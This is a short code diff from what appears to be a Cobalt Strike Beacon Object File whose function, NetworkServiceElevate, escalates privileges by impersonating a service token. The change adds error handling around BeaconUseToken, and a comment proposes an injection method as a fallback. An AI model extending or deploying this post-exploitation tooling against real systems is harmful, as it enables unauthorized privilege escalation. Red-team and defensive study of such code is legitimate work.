@@ -76,7 +76,14 @@ void NetworkServiceElevate( IN PCHAR Buffer, IN ULONG Length ) {
 	};
 
 	if ( ServiceTok != NULL ) {
-		BeaconUseToken( ServiceTok );
+		//
+		// If SeImpersonate() is not available, this will
+		// trigger and a failure will occur. As such, work
+		// on an injection method.
+		//
+		if ( ! BeaconUseToken( ServiceTok ) ) {
+			BeaconPrintf(CALLBACK_ERROR, "FAILURE: FAILED TO IMPERSONATE TOKEN\n");
+		};
 		KERNEL32$CloseHandle( ServiceTok );
 	};
 
